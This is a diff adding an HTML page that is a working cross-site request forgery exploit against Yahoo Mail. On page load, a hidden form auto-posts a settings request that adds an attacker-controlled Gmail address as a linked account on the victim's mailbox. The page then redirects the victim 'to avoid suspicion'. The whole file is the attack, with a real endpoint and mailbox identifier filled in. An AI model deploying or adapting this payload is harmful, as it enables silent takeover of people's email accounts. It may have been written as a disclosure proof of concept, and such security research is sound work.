@@ -1,0 +1,56 @@
+
+        <html>
+        <head>
+            <title>CSRF Add Account</title>
+        </head>
+        <body>
+            <p>Attempting to add a new account...</p>
+            <script>
+                window.onload = function() {
+                    // Simplified batchJson payload to add a new account
+                    const modifiedBatchJson = {
+                        "requests": [
+                            {
+                                "id": "AddAccount",
+                                "uri": "/ws/v3/mailboxes/@.id==VjN-En8KVWbXdI4787z5ADlsu1fy72Nho_HKi1JkNB6-Kh3t6GseMvX8t94BQpsKWDfRoHAwF1Pp4BrTLTUlPUAqGOEBd85xYELLNrFeN-G7e-2ldJA8i3vzfiNePJFcLA02/accounts",
+                                "method": "POST",
+                                "payload": {
+                                    "account": {
+                                        "email": "moodn3y@gmail.com", // Replace with an email you control
+                                        "type": "IMAPIN",
+                                        "sendingName": "",
+                                        "description": "Attacker Account",
+                                        "serverUri": "imaps://gmail.com",
+                                        "status": "ENABLED",
+                                        "authType": "OAUTH2",
+                                        "replyToAddress": "moodn3y@gmail.com"
+                                    }
+                                }
+                            }
+                        ],
+                        "responseType": "json"
+                    };
+
+                    // Create a form to send the POST request
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://mail.yahoo.com/ws/v3/batch?name=settings.addAccount&hash=2ad953db&appId=YMailNorrin&ymreqid=885e62df-0ebb-38fb-1c95-0a0004014f00&wssid=V2*I-LGtfX7qn2';
+
+                    const batchJsonInput = document.createElement('input');
+                    batchJsonInput.type = 'hidden';
+                    batchJsonInput.name = 'batchJson';
+                    batchJsonInput.value = JSON.stringify(modifiedBatchJson);
+                    form.appendChild(batchJsonInput);
+
+                    document.body.appendChild(form);
+                    form.submit();
+
+                    // Redirect to mail.yahoo.com after 5 seconds to avoid suspicion
+                    setTimeout(function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    }, 5000);
+                };
+            </script>
+        </body>
+        </html>
+        
